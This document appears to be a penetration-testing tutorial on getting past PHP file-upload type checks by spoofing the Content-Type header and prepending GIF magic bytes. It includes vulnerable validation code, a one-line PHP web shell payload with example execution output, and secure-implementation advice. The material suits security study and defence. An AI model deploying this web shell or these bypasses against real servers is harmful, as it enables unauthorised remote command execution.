
# File Upload Attacks - Type Filters (Content Validation)

## 🧪 Type Filters
When the server validates the actual file content instead of just the extension, exploitation becomes harder—but it remains entirely possible with the right techniques.

---

## 1️⃣ Content-Type Header (Client-Controlled)
The server checks the `Content-Type` header sent in the HTTP request.
**Vulnerable Example:**
```php
$type = $_FILES['uploadFile']['type'];
if (!in_array($type, ['image/jpg', 'image/png'])) {
    die("Only images are allowed");
}
```
⚠️ **Core Problem:** The client (attacker) controls this header. It can be easily modified using a proxy like Burp Suite.

### 🚀 Bypass: Manipulating Content-Type
1. Intercept the upload request.
2. Change the header: `Content-Type: image/jpeg`
3. Even if the body contains PHP code, the server accepts it because it "looks" like an image header.
4. **Result:** `shell.php` is uploaded and executable.

---

## 2️⃣ MIME-Type Validation (Magic Bytes)
This is a stronger, server-side validation that inspects the actual file data.
**Example:** `mime_content_type($file)`
It detects the file type using **Magic Bytes** (the first few bytes of a file).

| File Type | Signature (Hex/ASCII) |
| :--- | :--- |
| **GIF** | `GIF87a` or `GIF89a` |
| **PNG** | `\x89PNG` |
| **JPG** | `\xFF\xD8\xFF` |

### 🚀 Bypass: Magic Byte Injection
You can "disguise" your script by adding these bytes at the very beginning of your payload.
**Payload Example:**
`GIF8<?php system($_GET['cmd']); ?>`

1. The server reads the first few bytes, sees `GIF8`, and identifies the file as a GIF image.
2. The PHP interpreter ignores the non-PHP header and executes the code following it.
3. **Execution:** `http://SERVER/uploads/shell.php?cmd=id`
4. **Output:** `GIF8uid=33(www-data)`

---

## 🔥 Combo Attack (Real-World Scenario)
Real-world filters often combine all layers. A successful bypass requires a combination:
1. **Filename:** `shell.jpg.php` (Bypass Whitelist)
2. **Header:** `Content-Type: image/jpeg` (Bypass Type check)
3. **Content:** `GIF8[PHP_CODE]` (Bypass MIME/Magic Bytes)

---

## ⚠️ Core Weakness
The server relies on sources of truth that the attacker can manipulate:
- Filename (String)
- Headers (Metadata)
- File content (Raw bytes)

---

## 🛡️ Secure Implementation
A truly secure backend should:
- ✔️ **Re-encode images:** Use libraries like GD or ImageMagick to strip metadata and re-generate the image (this destroys embedded PHP).
- ✔️ **Validate Extension AND MIME AND Magic Bytes.**
- ✔️ **Rename files** to random strings.
- ✔️ **Storage:** Save files in a non-executable directory or an isolated S3 bucket.

---

## 💣 Key Summary
1. `Content-Type` = Trivial bypass via Burp.
2. `MIME/Magic Bytes` = Stronger, but bypassable by injecting headers into the payload.
3. If you control the first few bytes, you control the perceived file type.

---

## 🧠 Pentester Mindset
- Never trust a single validation mechanism.
- If an image header is required, prepend it to your web shell.
- Always check if the server re-processes the image or stores it exactly as sent.
